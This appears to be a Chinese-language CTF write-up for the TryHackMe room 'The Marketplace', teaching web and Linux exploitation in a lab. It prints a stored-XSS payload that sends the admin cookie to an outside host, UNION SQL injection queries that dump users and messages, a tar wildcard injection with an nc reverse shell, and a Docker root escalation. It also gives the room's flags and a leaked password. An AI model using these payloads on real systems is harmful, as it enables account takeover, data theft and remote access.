---
title: "The Marketplace"
outline: deep
tags: "CTF, writeup, TryHackMe"
updateTime: "2026-3-3 21:38"
---
# The Marketplace
## 0x 01 ROOM描述

```
The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.
```

## 0x 02 信息收集

靶机IP：

10.81.189.170

使用[GoAttack](https://github.com/dragonkeep/GoAttack/)进行扫描：

端口扫描结果发现开放了80端口Web服务、22端口SSH服务以及32768的HTTP服务（好像跟80端口内容一致）。

![image](assets/TheMarketplace/image-20260303172829-wehx6t6.png)

目录扫描结果发现存在`/admin`路径403无法访问

![image](assets/TheMarketplace/image-20260303172851-tbranck.png)

## 0x 03 渗透流程

访问80端口服务，是一个类似购物平台的服务

![image](assets/TheMarketplace/image-20260303165455-57duzfn.png)

右上角发现存在注册功能，尝试注册用户`test/test`

![image](assets/TheMarketplace/image-20260303165637-hx1hky6.png)

登录后存在`New listing`功能

![image](assets/TheMarketplace/image-20260303165820-7rl01gb.png)

尝试插入XSS payload

```
<script>alert("dragonkeep")</script>
```

![image](assets/TheMarketplace/image-20260303165749-2nd0jrw.png)

发现成功执行`alert`函数

![image](assets/TheMarketplace/image-20260303170130-q56nvip.png)

创建的`listing`存在举报功能，并且该功能admin用户会进行审核。

![image](assets/TheMarketplace/image-20260303170227-lm8gir5.png)

根据该功能结合XSS，使用`fetch`函数构造恶意XSS payload获取admin Cookie

```
<script>fetch('http://192.168.197.102:8000/steal?cookie=' + btoa(document.cookie));</script>
```

本地开启一个Python 的HTTP服务用于接收Cookie

```
python -m http.server 8000
```

![image](assets/TheMarketplace/image-20260303170711-f0o8zra.png)

成功获取管理员用户michael的Cookie

![image](assets/TheMarketplace/image-20260303170922-ceoc7gh.png)

修改浏览器Cookie并访问/admin目录

![image](assets/TheMarketplace/image-20260303171025-6pm14jn.png)

成功登录到管理员用户，并获取flag

![image](assets/TheMarketplace/image-20260303171115-u6ws98i.png)

> THM\{c37a63895910e478f28669b048c348d5\}

测试参数user，发现存在SQL语句报错，尝试进行SQL注入

![image](assets/TheMarketplace/image-20260303171250-khbbaj7.png)

尝试爆破字列数

```
0 UNION SELECT 1,2,3,4 —
```

![image](assets/TheMarketplace/image-20260303192434-1tk479f.png)

```
0 UNION SELECT 1,group_concat(SCHEMA_NAME),3,4 from INFORMATION_SCHEMA.SCHEMATA -- -
```

![image](assets/TheMarketplace/image-20260303192500-l6v9f7n.png)

```
0 UNION SELECT 1, group_concat(TABLE_NAME),3,4 from information_schema.tables where table_schema = 'marketplace' -- -
```

![image](assets/TheMarketplace/image-20260303192528-8uhqpa2.png)

```
0 UNION SELECT 1,group_concat(COLUMN_NAME),3,4 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' -- -
```

![image](assets/TheMarketplace/image-20260303192635-3djrctn.png)

获取用户名和密码：

```
0 UNION SELECT 1,group_concat(username),3,4 from marketplace.users-- -
0 UNION SELECT 1,group_concat(username,':',password),3,4 from marketplace.users-- -
```

![image](assets/TheMarketplace/image-20260303193220-lu2ta35.png)

```
0 UNION SELECT 1, group_concat(id, ':', is_read, ':',message_content,':',user_from, ':',user_to, '\n'),3,4 from marketplace.messages-- -
```

![image](assets/TheMarketplace/image-20260303192805-kaip7lq.png)

获得新密码，并且告诉你是SSH服务的

```
@b_ENXkGYUCAv3zJ
```

尝试使用用户名`Jake`登录到SSH服务

![image](assets/TheMarketplace/image-20260303193341-9prdgd6.png)

>  THM\{c3648ee7af1369676e3e4b15da6dc0b4\}

使用`sudo -l`查看sudo可以执行的指令，发现存在备份脚本`/opt/backups/backup.sh`，并且存在tar指令通配符漏洞

![image](assets/TheMarketplace/image-20260303193429-w1dpmax.png)

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.197.102 1234 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

![image](assets/TheMarketplace/image-20260303194302-ac0oyjp.png)

开启nc监听

![image](assets/TheMarketplace/image-20260303194317-v4bdkdh.png)

![image](assets/TheMarketplace/image-20260303194523-l7w2r11.png)

![image](assets/TheMarketplace/image-20260303194533-mkwouqa.png)

发现用户michael在docker组当中,开启tty后直接docker提权了

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![image](assets/TheMarketplace/image-20260303194713-0zu47ks.png)

> THM\{d4f76179c80c0dcf46e0f8e43c9abd62\}

## 0x 04 All Flags

Admin

> THM\{c37a63895910e478f28669b048c348d5\}

User.txt

>  THM\{c3648ee7af1369676e3e4b15da6dc0b4\}

Root.txt

>  THM\{d4f76179c80c0dcf46e0f8e43c9abd62\}